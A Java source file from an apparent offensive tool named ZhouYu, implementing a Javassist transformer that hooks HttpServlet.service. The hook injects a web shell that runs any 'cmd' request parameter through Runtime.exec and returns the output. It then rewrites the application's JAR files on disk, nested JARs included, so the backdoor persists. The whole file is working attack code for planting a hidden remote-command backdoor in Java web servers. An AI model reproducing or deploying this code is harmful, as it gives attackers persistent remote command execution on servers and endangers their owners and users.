package zhouyu.core.init;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.HashSet;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.zip.CRC32;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.LoaderClassPath;
import zhouyu.core.transformer.Transformer;
import zhouyu.core.util.JavassistUtil;

public class WriteShellTransformer implements Transformer {

    private String[][] methods = new String[][] {
        new String[] {"javax/servlet/http/HttpServlet", "javax.servlet.http.HttpServlet", "service", "(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V"},
    };

    private Set<String> cache = new HashSet<>();

    @Override
    public boolean condition(String className) {
        for (int i = 0; i < methods.length; i++) {
            if (className.equals(methods[i][0]) || className.equals(methods[i][1])) {
                return true;
            }
        }
        return false;
    }

    @Override
    public byte[] transformer(ClassLoader loader, String className, byte[] codeBytes) {
        for (int i = 0; i < methods.length; i++) {
            if (className.equals(methods[i][0]) || className.equals(methods[i][1])) {
                codeBytes = insertShell(methods[i][2], methods[i][3], loader, codeBytes, getBeforeInsertCode());
            }
        }
        return codeBytes;
    }

    private String getBeforeInsertCode() {
        StringBuilder codeBuilder = new StringBuilder()
            .append("String cmd = $1.getParameter(\"cmd\");").append("\n")
            .append("if (cmd != null) {").append("\n")
            .append("   try {").append("\n")
            .append("       String[] cmds = cmd.split(\" \");").append("\n")
            .append("       InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();").append("\n")
            .append("       StringBuilder stringBuilder = new StringBuilder();").append("\n")
            .append("       BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));").append("\n")
            .append("       String line;").append("\n")
            .append("       while((line = bufferedReader.readLine()) != null) {").append("\n")
            .append("           stringBuilder.append(line).append(\"\\n\");").append("\n")
            .append("       }").append("\n")
            .append("       byte[] res = stringBuilder.toString().getBytes(StandardCharsets.UTF_8);").append("\n")
            .append("       $2.getOutputStream().write(res);").append("\n")
//            .append("       $2.getOutputStream().flush();").append("\n")
//            .append("       $2.getOutputStream().close();").append("\n")
            .append("   } catch (Throwable throwable) {").append("\n")
            .append("       throwable.printStackTrace();").append("\n")
            .append("   }").append("\n")
            .append("}").append("\n")
            ;
        return codeBuilder.toString();
    }

    private byte[] insertShell(String hookMethod, String hookMethodSignature, ClassLoader loader, byte[] codeBytes, String beforeCode) {
        CtClass ctClass = null;
        try {
            ClassPool classPool = ClassPool.getDefault();
            classPool.appendClassPath(new LoaderClassPath(loader));
            classPool.importPackage("java.io.InputStream");
            classPool.importPackage("java.lang.Runtime");
            classPool.importPackage("java.lang.StringBuilder");
            classPool.importPackage("java.io.BufferedReader");
            classPool.importPackage("java.io.InputStreamReader");
            classPool.importPackage("java.nio.charset.StandardCharsets");
            ctClass = classPool.makeClass(new ByteArrayInputStream(codeBytes));
            if (hookMethod.equals("<init>")) {
                Set<CtConstructor> ctConstructors = JavassistUtil.getAllConstructors(ctClass);
                for (CtConstructor ctConstructor : ctConstructors) {
                    if (ctConstructor.getSignature().equals(hookMethodSignature) || hookMethodSignature.equals("*")) {
                        System.out.println(String.format("[ZhouYu] hook %s %s %s", ctClass.getName(), ctConstructor.getName(), ctConstructor.getSignature()));
                        ctConstructor.insertBefore(beforeCode);
                    }
                }
            } else {
                Set<CtMethod> methods = JavassistUtil.getAllMethods(ctClass);
                for (CtMethod ctMethod : methods) {
                    if ((Modifier.NATIVE & ctMethod.getModifiers()) == 0 && ctMethod.getName().equals(hookMethod) && (ctMethod.getSignature().equals(hookMethodSignature) || hookMethodSignature.equals("*"))) {
                        System.out.println(String.format("[ZhouYu] hook %s %s %s", ctClass.getName(), ctMethod.getName(), ctMethod.getSignature()));
                        ctMethod.insertBefore(beforeCode);
                    }
                }
            }
            if (!cache.contains(ctClass.getName())) {
                System.out.println(ctClass.getURL().getFile());
                overrideClassForJar(ctClass.getURL().getFile(), ctClass.toBytecode());
                cache.add(ctClass.getName());
            }
            return ctClass.toBytecode();
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            if (ctClass != null) {
                ctClass.detach();
            }
        }
        return codeBytes;
    }

    private void overrideClassForJar(String path, byte[] codeBytes) {
        try {
            if (!path.contains("!/")) {
                if (path.endsWith(".class")) {
                    try {
                        Files.write(Paths.get(path), codeBytes);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            String origin = path.replace("file:", "");
            String[] paths = origin.split("!/");
            String jar = paths[0];
            String secondJar = paths.length == 3 ? paths[1] : "NULL";
            String target = jar + ".target";
            int index = jar.lastIndexOf(File.separator);
            String bk = jar.substring(0, index + 1) + "." + jar.substring(index + 1) + ".bk";
            String classPath = paths.length == 2 ? paths[1] : paths[2];

            byte[] bytes = new byte[1024];
            int count;
            JarEntry jarEntry;
            JarInputStream jarInputStream = new JarInputStream(new FileInputStream(jar));
            Manifest manifest = getManifest(new JarInputStream(new FileInputStream(jar)));
            JarOutputStream jarOutputStream = manifest == null ?
                new JarOutputStream(new FileOutputStream(target))
                : new JarOutputStream(new FileOutputStream(target), manifest);
            while((jarEntry = jarInputStream.getNextJarEntry()) != null) {
                if (jarEntry.getName().equals("META-INF/MANIFEST.MF")) {
                    continue;
                }
                if (jarEntry.getName().equals(secondJar)) {
                    System.out.println(String.format("替换jar: %s", jarEntry.getName()));
                    ByteArrayOutputStream readByteArrayOutputStream = new ByteArrayOutputStream();
                    while ((count = jarInputStream.read(bytes)) != -1) {
                        readByteArrayOutputStream.write(bytes, 0, count);
                    }
                    JarInputStream jarInputStream2 = new JarInputStream(new ByteArrayInputStream(readByteArrayOutputStream.toByteArray()));
                    manifest = getManifest(new JarInputStream(new ByteArrayInputStream(readByteArrayOutputStream.toByteArray())));
                    ByteArrayOutputStream writeByteArrayOutputStream = new ByteArrayOutputStream();
                    JarOutputStream jarOutputStream2 = manifest == null ?
                        new JarOutputStream(writeByteArrayOutputStream)
                        : new JarOutputStream(writeByteArrayOutputStream, manifest);
                    JarEntry jarEntry2;
                    while((jarEntry2 = jarInputStream2.getNextJarEntry()) != null) {
                        if (jarEntry2.getName().equals("META-INF/MANIFEST.MF")) {
                            continue;
                        }
                        if (jarEntry2.getName().equals(classPath)) {
                            JarEntry newJarEntry = new JarEntry(jarEntry2.getName());
                            newJarEntry.setMethod(JarEntry.STORED);
                            newJarEntry.setCompressedSize(codeBytes.length);
                            newJarEntry.setSize(codeBytes.length);
                            CRC32 crc = new CRC32();
                            crc.reset();
                            crc.update(codeBytes);
                            newJarEntry.setCrc(crc.getValue());
                            jarOutputStream2.putNextEntry(newJarEntry);
                            jarOutputStream2.write(codeBytes);
                            System.out.println(String.format("替换内部jar: %s 中的class: %s", jarEntry.getName(), jarEntry2.getName()));
                        } else {
                            jarOutputStream2.putNextEntry(jarEntry2);
                            while ((count = jarInputStream2.read(bytes)) != -1) {
                                jarOutputStream2.write(bytes, 0, count);
                            }
                        }
                        jarOutputStream2.closeEntry();
                        jarInputStream2.closeEntry();
                    }
                    jarOutputStream2.close();
                    jarInputStream2.close();
                    JarEntry newJarEntry = new JarEntry(jarEntry.getName());
                    newJarEntry.setMethod(JarEntry.STORED);
                    newJarEntry.setCompressedSize(writeByteArrayOutputStream.size());
                    newJarEntry.setSize(writeByteArrayOutputStream.size());
                    CRC32 crc = new CRC32();
                    crc.reset();
                    crc.update(writeByteArrayOutputStream.toByteArray());
                    newJarEntry.setCrc(crc.getValue());
                    jarOutputStream.putNextEntry(newJarEntry);
                    jarOutputStream.write(writeByteArrayOutputStream.toByteArray());
                } else {
                    if (jarEntry.getName().equals(classPath)) {
                        JarEntry newJarEntry = new JarEntry(jarEntry.getName());
                        newJarEntry.setMethod(JarEntry.STORED);
                        newJarEntry.setCompressedSize(codeBytes.length);
                        newJarEntry.setSize(codeBytes.length);
                        CRC32 crc = new CRC32();
                        crc.reset();
                        crc.update(codeBytes);
                        newJarEntry.setCrc(crc.getValue());
                        jarOutputStream.putNextEntry(newJarEntry);
                        jarOutputStream.write(codeBytes);
                        System.out.println(String.format("替换class: %s", jarEntry.getName()));
                    } else {
                        jarOutputStream.putNextEntry(jarEntry);
                        while ((count = jarInputStream.read(bytes)) != -1) {
                            jarOutputStream.write(bytes, 0, count);
                        }
                    }
                }
                jarOutputStream.closeEntry();
                jarInputStream.closeEntry();
            }
            jarInputStream.close();
            jarOutputStream.close();

            Files.write(Paths.get(bk), Files.readAllBytes(Paths.get(jar)));
            Files.write(Paths.get(jar), Files.readAllBytes(Paths.get(target)));
            Files.delete(Paths.get(target));
            System.out.println("替换" + jar + "完成，使用结束记得删除它哦！原有jar已备份为" + bk);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private Manifest getManifest(JarInputStream jarInputStream) throws IOException {
        Manifest manifest = null;
        byte[] bytes = new byte[1024];
        int count;
        JarEntry jarEntry;
        if (jarInputStream.getManifest() == null) {
            while((jarEntry = jarInputStream.getNextJarEntry()) != null) {
                if (jarEntry.getName().equals("META-INF/MANIFEST.MF")) {
                    ByteArrayOutputStream readByteArrayOutputStream = new ByteArrayOutputStream();
                    while ((count = jarInputStream.read(bytes)) != -1) {
                        readByteArrayOutputStream.write(bytes, 0, count);
                    }
                    manifest = new Manifest();
                    manifest.read(new ByteArrayInputStream(readByteArrayOutputStream.toByteArray()));
                    break;
                }
            }
        } else {
            manifest = jarInputStream.getManifest();
        }
        jarInputStream.close();
        return manifest;
    }
}
